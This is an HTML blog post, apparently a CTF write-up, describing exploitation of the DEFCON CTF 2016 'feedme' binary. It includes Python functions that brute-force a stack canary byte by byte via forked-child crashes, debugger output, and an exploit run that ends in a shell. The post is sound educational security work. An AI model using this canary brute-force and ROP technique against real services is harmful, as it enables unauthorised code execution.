@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+
+  <title>DEFCON CTF 2016 - feedme</title>
+
+  
+
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="referrer" content="origin" />
+  <meta name="generator" content="Pelican" />
+<link href="https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html" rel="canonical" />
+  <!-- Feed -->
+        <link href="https://blahcat.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Full Atom Feed" />
+          <link href="https://blahcat.github.io/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="BlahCats Categories Atom Feed" />
+
+  <link href="https://blahcat.github.io/theme/css/style.css" type="text/css" rel="stylesheet" />
+
+  <!-- Code highlight color scheme -->
+      <link href="https://blahcat.github.io/theme/css/code_blocks/github.css" rel="stylesheet">
+
+    <!-- CSS specified by the user -->
+
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://blahcat.github.io/assets/css/overrides.css" type="text/css" rel="stylesheet" />
+
+
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+
+  <!-- Custom fonts -->
+  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,300' rel='stylesheet' type='text/css' />
+  <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet" type="text/css" />
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+
+
+
+    <meta name="description" content="Info The vulnerable file was given with the instructions: Don't forget to feed me http://www.scs.stanford.edu/brop/ Here are some info...">
+
+    <meta name="author" content="hugsy">
+
+    <meta name="tags" content="pwn">
+    <meta name="tags" content="defcon-2016">
+    <meta name="tags" content="x86">
+    <meta name="tags" content="brop">
+
+
+
+
+<!-- Open Graph -->
+<meta prefix="og: http://ogp.me/ns#" property="og:site_name" content="BlahCats"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:title" content="DEFCON CTF 2016 - feedme"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:description" content="Info The vulnerable file was given with the instructions: Don't forget to feed me http://www.scs.stanford.edu/brop/ Here are some info..."/>
+<meta prefix="og: http://ogp.me/ns#" property="og:locale" content="en_US"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:url" content="https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:type" content="article"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:published_time" content="2016-05-23 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:modified_time" content="2016-05-23 00:00:00-07:00"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:author" content="https://blahcat.github.io/author/hugsy">
+<meta prefix="og: http://ogp.me/ns#" property="article:section" content="ctf"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="pwn"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="defcon-2016"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="x86"/>
+<meta prefix="og: http://ogp.me/ns#" property="article:tag" content="brop"/>
+<meta prefix="og: http://ogp.me/ns#" property="og:image" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+<!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@ctf_blahcat">
+    <meta name="twitter:title" content="DEFCON CTF 2016 - feedme">
+    <meta name="twitter:url" content="https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html">
+
+        <meta name="twitter:image:src" content="https://blahcat.github.io/assets/images/blog-cover.png">
+
+      <meta name="twitter:description" content="Info The vulnerable file was given with the instructions: Don't forget to feed me http://www.scs.stanford.edu/brop/ Here are some info...">
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "name": "DEFCON CTF 2016 - feedme",
+  "headline": "DEFCON CTF 2016 - feedme",
+  "datePublished": "2016-05-23 00:00:00-07:00",
+  "dateModified": "2016-05-23 00:00:00-07:00",
+  "author": {
+    "@type": "Person",
+    "name": "hugsy",
+    "url": "https://blahcat.github.io/author/hugsy"
+  },
+  "image": "https://blahcat.github.io/assets/images/blog-cover.png",
+  "url": "https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html",
+  "description": "Info The vulnerable file was given with the instructions: Don't forget to feed me http://www.scs.stanford.edu/brop/ Here are some info..."
+}
+</script>
+</head>
+<!-- TODO : Body class -->
+<body class="home-template">
+
+<nav id="menu">
+  <a class="close-button">Close</a>
+  <div class="nav-wrapper">
+    <p class="nav-label">Menu</p>
+    <ul>
+          <li><a href="/pages/about.html" role="presentation">About</a></li>
+          <li><a href="/categories/" role="presentation">Browse By Category</a></li>
+          <li><a href="/tags/" role="presentation">Browse By Tag</a></li>
+          <li><a href="/pages/qemu-vm-repo" role="presentation">Qemu VMs</a></li>
+          <li><a href="/pages/exploitation-series" role="presentation">Exploitation Tutorials</a></li>
+          <li><a href="/pages/notes" role="presentation">Misc Notes</a></li>
+          <li><a href="/feeds/all.atom.xml" role="presentation">RSS Feed</a></li>
+
+
+    </ul>
+  </div>
+</nav>
+    <!-- Progressbar -->
+    <div class="progress-container">
+        <span class="progress-bar"></span>
+    </div>
+
+    <!-- Page Header -->
+    <!-- Set your background image for this header on the line below. -->
+    <header id="post-header" class="has-cover">
+      <div class="inner">
+        <nav id="navigation">
+            <span id="home-button" class="nav-button">
+                <a class="home-button" href="https://blahcat.github.io/" title="Home"><i class="ic ic-arrow-left"></i> Home</a>
+            </span>
+          <span id="menu-button" class="nav-button">
+            <a class="menu-button"><i class="ic ic-menu"></i> Menu</a>
+          </span>
+        </nav>
+        <h1 class="post-title">DEFCON CTF 2016 - feedme</h1>
+        <!-- TODO : Proper class for headline -->
+        <span class="post-meta">
+                <a href="https://blahcat.github.io/author/hugsy">hugsy</a>
+            <br>
+              Posted on <time style="font-weight: bold">23 May 2016</time>
+          </span>
+
+            <div class="post-cover cover" style="background-image: url('https://blahcat.github.io/assets/images/blog-cover.png')">
+      </div>
+    </header>
+
+  <section id="wrapper">
+    <a class="hidden-close"></a>
+
+    <!-- Post content -->
+    <main class="content" role="main">
+        <article class="post">
+        <div class="inner">
+            <section class="post-content">
+                <h3>Info</h3>
+<p>The vulnerable file was given with the instructions:</p>
+<div class="highlight"><pre><span></span><code>Don&#39;t forget to feed me
+http://www.scs.stanford.edu/brop/
+</code></pre></div>
+
+<p>Here are some info given by <code>gef</code>:</p>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>!file<span class="w"> </span>./feedme
+./feedme:<span class="w"> </span>ELF<span class="w"> </span><span class="m">32</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,<span class="w"> </span>Intel<span class="w"> </span><span class="m">80386</span>,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>statically<span class="w"> </span>linked,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">2</span>.6.24,<span class="w"> </span>stripped
+gef➤<span class="w">  </span>checksec
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>checksec<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;/home/vagrant/feedme&#39;</span>
+Canary:<span class="w">                                           </span>No
+NX<span class="w"> </span>Support:<span class="w">                                       </span>Yes
+PIE<span class="w"> </span>Support:<span class="w">                                      </span>No
+RPATH:<span class="w">                                            </span>No
+RUNPATH:<span class="w">                                          </span>No
+Partial<span class="w"> </span>RelRO:<span class="w">                                    </span>No
+Full<span class="w"> </span>RelRO:<span class="w">                                       </span>No
+</code></pre></div>
+
+<p><code>feedme</code> is statically linked x86 binary that forks and then expects "to be fed"
+with some input. Pretty simple, right?</p>
+<h3>Vulnerability</h3>
+<p>The vulnerability in this case is easy to spot:</p>
+<div class="highlight"><pre><span></span><code>gef➤<span class="w">  </span>c
+Continuing.
+<span class="o">[</span>New<span class="w"> </span>process<span class="w"> </span><span class="m">1349</span><span class="o">]</span>
+FEED<span class="w"> </span>ME!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ATE<span class="w"> </span><span class="m">41414141414141414141414141414141</span>...
+***<span class="w"> </span>stack<span class="w"> </span>smashing<span class="w"> </span>detected<span class="w"> </span>***:<span class="w"> </span>/home/vagrant/feedme<span class="w"> </span>terminated
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGABRT,<span class="w"> </span>Aborted.
+<span class="o">[</span>Switching<span class="w"> </span>to<span class="w"> </span>process<span class="w"> </span><span class="m">1349</span><span class="o">]</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span>registers<span class="o">]</span>──
+<span class="nv">$eax</span><span class="w">     </span>0x00000000<span class="w"> </span><span class="nv">$ebx</span><span class="w">     </span>0x00000545<span class="w"> </span><span class="nv">$ecx</span><span class="w">     </span>0x00000545<span class="w"> </span><span class="nv">$edx</span><span class="w">     </span>0x00000006<span class="w"> </span><span class="nv">$esp</span><span class="w">     </span>0xffffd388<span class="w"> </span><span class="nv">$ebp</span><span class="w">     </span>0xffffd5f8
+<span class="nv">$esi</span><span class="w">     </span>0xffffd518<span class="w"> </span><span class="nv">$edi</span><span class="w">     </span>0xffffd434<span class="w"> </span><span class="nv">$eip</span><span class="w">     </span>0xf7ffdba0<span class="w"> </span><span class="nv">$cs</span><span class="w">      </span>0x00000023<span class="w"> </span><span class="nv">$ss</span><span class="w">      </span>0x0000002b<span class="w"> </span><span class="nv">$ds</span><span class="w">      </span>0x0000002b
+<span class="nv">$es</span><span class="w">      </span>0x0000002b<span class="w"> </span><span class="nv">$fs</span><span class="w">      </span>0x00000000<span class="w"> </span><span class="nv">$gs</span><span class="w">      </span>0x00000063<span class="w"> </span><span class="nv">$eflags</span><span class="w">  </span><span class="o">[</span><span class="w"> </span>IF<span class="w"> </span><span class="o">]</span>
+Flags:<span class="w"> </span><span class="o">[</span><span class="w"> </span>carry<span class="w">  </span>parity<span class="w">  </span>adjust<span class="w">  </span>zero<span class="w">  </span>sign<span class="w">  </span><span class="nb">trap</span><span class="w">  </span>INTERRUPT<span class="w">  </span>direction<span class="w">  </span>overflow<span class="w">  </span>resume<span class="w">  </span>virtualx86<span class="w">  </span>identification<span class="w"> </span><span class="o">]</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span>stack<span class="o">]</span>──
+0xffffd388│+0x00:<span class="w"> </span>0xffffd5f8<span class="w"> </span>→<span class="w"> </span>0xffffd678<span class="w"> </span>→<span class="w"> </span>0x41414141<span class="w">      </span>←<span class="w"> </span><span class="nv">$sp</span>
+0xffffd38c│+0x04:<span class="w"> </span>0x6
+0xffffd390│+0x08:<span class="w"> </span>0x545
+0xffffd394│+0x0c:<span class="w"> </span>0x0807bed7<span class="w"> </span>→<span class="w"> </span>cmp<span class="w"> </span>eax,0xfffff000
+0xffffd398│+0x10:<span class="w"> </span><span class="s2">&quot;A&quot;</span>
+0xffffd39c│+0x14:<span class="w"> </span>0x0804e3e1<span class="w"> </span>→<span class="w"> </span>mov<span class="w"> </span>edx,DWORD<span class="w"> </span>PTR<span class="w"> </span>gs:0x8
+0xffffd3a0│+0x18:<span class="w"> </span>0x6
+0xffffd3a4│+0x1c:<span class="w"> </span>0xffffd3b4<span class="w"> </span>→<span class="w"> </span><span class="s2">&quot; &quot;</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span>code:i386<span class="o">]</span>──
+0xf7ffdb9b<span class="w">   </span>&lt;__kernel_vsyscall+11&gt;<span class="w">  </span>nop
+0xf7ffdb9b<span class="w">   </span>&lt;__kernel_vsyscall+11&gt;<span class="w">  </span>nop
+0xf7ffdb9c<span class="w">   </span>&lt;__kernel_vsyscall+12&gt;<span class="w">  </span>nop
+0xf7ffdb9d<span class="w">   </span>&lt;__kernel_vsyscall+13&gt;<span class="w">  </span>nop
+0xf7ffdb9e<span class="w">   </span>&lt;__kernel_vsyscall+14&gt;<span class="w">  </span>int<span class="w">    </span>0x80
+0xf7ffdba0<span class="w">   </span>&lt;__kernel_vsyscall+16&gt;<span class="w">  </span>pop<span class="w">    </span>ebp<span class="w">          </span>←<span class="w"> </span><span class="nv">$pc</span>
+<span class="o">[</span>...<span class="o">]</span>
+</code></pre></div>
+
+<p>The interesting function is at 0x08049036:</p>
+<p><img alt="do-feedme" src="https://i.imgur.com/WLAWsAW.png"></p>
+<p>This function basically will:</p>
+<ol>
+<li><code>0x8049053-0x8049058</code>: call the <code>xread_char()</code> function, which will read 1
+      character from stdin and store it in the stack variable (called <code>len</code>);</li>
+<li><code>0x804905F-0x8049069</code>: use this variable as the number of byte to read from stdin in the call to
+      <code>xread_buffer()</code>, and store the result in the stack buffer allocated,
+      called <code>buf</code>, whose size is 0x20 bytes;</li>
+<li><code>0x804907E-0x8049084</code>: copy the <code>buf</code> content to a bigger array (0x400 bytes) located at the
+      address 0x80EBF40.</li>
+<li><code>0x804909D-0x80490A7</code>check if the <code>canary</code> variable has been tampered with, if so leave in
+      error.</li>
+</ol>
+<p>So we have a traditional stack buffer overflow, where we need to bypass the
+canary token.</p>
+<h3>Exploitation</h3>
+<p>Before continuing, I would recommend reading the paper &amp; slides related to the
+<a href="http://www.scs.stanford.edu/brop/">blind-rop technique</a> we're going to be using.</p>
+<p>Since the child process is being forked, we know that the parent and child are
+identical in every way, including the memory mapping and the canary token. So
+the idea for this exploitation is to bruteforce one-by-one all the bytes from the
+canary variable in stack, with the following binary logic: overwrite one byte of
+the canary with a value, <code>X</code>. If we have a crash, it will mean that the canary is
+corrupted, and therefore <code>X</code> is not valid. If it does not crash, then <code>X</code> is
+valid, and we can reproduce this action with the following canary byte
+(this is very analog to the exploitation of a colour-blind SQL
+injection exploitation).</p>
+<p>So we have this buffer:</p>
+<div class="highlight"><pre><span></span><code><span class="p">|</span><span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="m">4</span><span class="p">|</span>
+</code></pre></div>
+
+<p>If we attempt to corrupt the first byte of the canary with a wrong value, our
+process will be killed immediately and we will receive the message ("Child exit"):</p>
+<div class="highlight"><pre><span></span><code><span class="p">|</span><span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="w"> </span>A<span class="p">|</span><span class="w"> </span>X<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="m">4</span><span class="p">|</span>
+</code></pre></div>
+
+<p>But when the value for the byte is valid, the program will continue its
+execution at 0x080490DF and display a message ("YUM, got...").</p>
+<div class="highlight"><pre><span></span><code>080490DF<span class="w"> </span>mov<span class="w">     </span><span class="o">[</span>esp+4<span class="o">]</span>,<span class="w"> </span>eax
+080490E3<span class="w"> </span>mov<span class="w">     </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,<span class="w"> </span>offset<span class="w"> </span>aYumGotDBytes<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="s2">&quot;YUM, got %d bytes!\n&quot;</span>
+080490EA<span class="w"> </span>call<span class="w">    </span>xprintf
+</code></pre></div>
+
+<p>So leaking one byte can be summed with the following Python code:</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">leak_canary_byte</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">prefix</span><span class="p">,</span> <span class="n">off</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="n">prefix</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">xsend</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">res2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res2</span> <span class="o">!=</span> <span class="s2">&quot;Child exit.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">:</span>      <span class="c1"># if we don&#39;t get the &quot;Child exit.&quot; message, then our current value is correct</span>
+            <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">return</span> <span class="kc">None</span>
+</code></pre></div>
+
+<p>Once we have the value of the first byte, we resume the same operation with the
+2nd and so on, until having the 4 bytes forming the canary.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">leak_canary</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">can</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">leak_canary_byte</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">can</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">b</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="n">err</span><span class="p">(</span><span class="s2">&quot;bail&quot;</span><span class="p">)</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">ok</span><span class="p">(</span><span class="s2">&quot;Found canary[</span><span class="si">%d</span><span class="s2">]=</span><span class="si">%.2x</span><span class="s2">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)))</span>
+        <span class="n">can</span> <span class="o">+=</span> <span class="n">b</span>
+    <span class="k">return</span> <span class="n">can</span>
+</code></pre></div>
+
+<p>We know control the execution flow without triggerring the <code>canary_fail()</code>
+function. All we need to do is build the shellcode using regular ROP. Since the
+binary is statically compiled, we have more gadgets than we need.</p>
+<p>So wrap this all up in a
+<a href="https://gist.github.com/hugsy/0f196cfb8c62a4c56fdbc424cb7883bf">final exploit</a>
+and you have code execution:</p>
+<div class="highlight"><pre><span></span><code>/<span class="w"> </span>$<span class="w"> </span>./feedme.py<span class="w">                                                                                                                                                                             </span><span class="o">[</span><span class="m">18</span>:58<span class="o">]</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">172</span>.28.128.4:4092
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Leaking<span class="w"> </span>canary<span class="w"> </span>using<span class="w"> </span>BROP
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>canary<span class="o">[</span><span class="m">0</span><span class="o">]=</span><span class="m">00</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>canary<span class="o">[</span><span class="m">1</span><span class="o">]=</span>0c
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>canary<span class="o">[</span><span class="m">2</span><span class="o">]=</span><span class="m">77</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>canary<span class="o">[</span><span class="m">3</span><span class="o">]=</span>9a
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>canary<span class="w"> </span><span class="s1">&#39;0x9a770c00&#39;</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Building<span class="w"> </span>shellcode
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>shellcode
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Get<span class="w"> </span>a<span class="w"> </span>PTY<span class="w"> </span>with<span class="w"> </span><span class="s1">&#39; python -c &quot;import pty;pty.spawn(&#39;</span>/bin/bash<span class="s1">&#39;)&quot;   &#39;</span>
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>vagrant<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>vagrant<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>vagrant<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
+You<span class="w"> </span>ran<span class="w"> </span>out<span class="w"> </span>of<span class="w"> </span>time,<span class="w"> </span>closing!
+</code></pre></div>
+
+<p>And find the flag <code>The flag is: It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO</code></p>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=DEFCON CTF 2016 - feedme&amp;url=https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/defcon-2016">defcon-2016</a><a href="https://blahcat.github.io/tag/x86">x86</a><a href="https://blahcat.github.io/tag/brop">brop</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=DEFCON CTF 2016 - feedme">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">DEFCON CTF 2016 - heapfun4u</h2>
+                            <p class="post-nav-excerpt">Info The vulnerable file was given with the following instructions: Guess what, it is...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2016/05/09/asis-ctf-2016-feap-write-up.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">ASIS CTF 2016 - feap write-up</h2>
+                            <p class="post-nav-excerpt">Info As usual, the vulnerable file is here gef➤ !file ./feap ./feap: ELF 64-bit LSB...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
